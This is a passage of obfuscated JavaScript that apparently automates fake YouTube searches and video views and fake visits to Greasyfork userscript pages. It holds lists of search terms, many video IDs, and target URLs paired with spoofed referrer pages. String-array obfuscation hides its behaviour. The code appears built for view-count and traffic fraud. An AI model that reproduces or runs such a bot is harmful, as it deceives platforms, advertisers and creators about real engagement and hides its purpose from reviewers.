'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + W(0x2) + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1 * -0x1ded + -0x170a + 0x3501)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x124 * 0x1 + 0x93 * 0x2d + -0x1af1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x2299 + -0x2 * 0x12d5 + -0x13f * -0x3a);

function a() {
  const bn = [
    'ange;v=b3;',
    'https://ba',
    ',mister\x20be',
    'omoo.io\x20tr',
    'osu4qYvfocu4na',
    'cripts/by-',
    'zMLSDgvY',
    'W5BcSv7cGxFcG8kIBxum',
    'DY53C2OUy29TlW',
    'n8kzW7LuW4pcOW',
    'CmoQvSkGECojhCoYzvm',
    'lw9TBMLMB2n1CW',
    'WOBdJmkKW5ZdSaDDWO/dPSkh',
    'W5hcGwNcPwtcI8ofusNcTa',
    'C2HTywnPBNr5CG',
    'kmo9y8o0WR/cOmkNmCoyma',
    'WPPmWRddM8oItCkjiSkaW7u',
    'newPage',
    'mi0nGt2B-q',
    'W4FcKxjuB8kFWQlcKce9',
    'WRG1pSkZmG',
    'WPPqWQRdKmk+eSozF8ogWQ4',
    'sNnlwJqXDvrLzW',
    'CMCVzw4VC2nYAq',
    'W6HMumoDeu3dPCo2W6hdQq',
    'qaf8oc4Hx8oJkSk8',
    'vvLYBxfmm2npra'
  ];
  a = function() {
    return bn;
  };
  return a();
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    X(0x16) + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    Y(0xc, '04Mq') + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    Y(0x13, 'JJff') + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    Y(0xa, 'uRXM') + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    W(0x12) + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    Y(0x19, 'fHIO') + 'U',
    X(0x1a) + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + W(0x5) + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x17) + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x17) + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
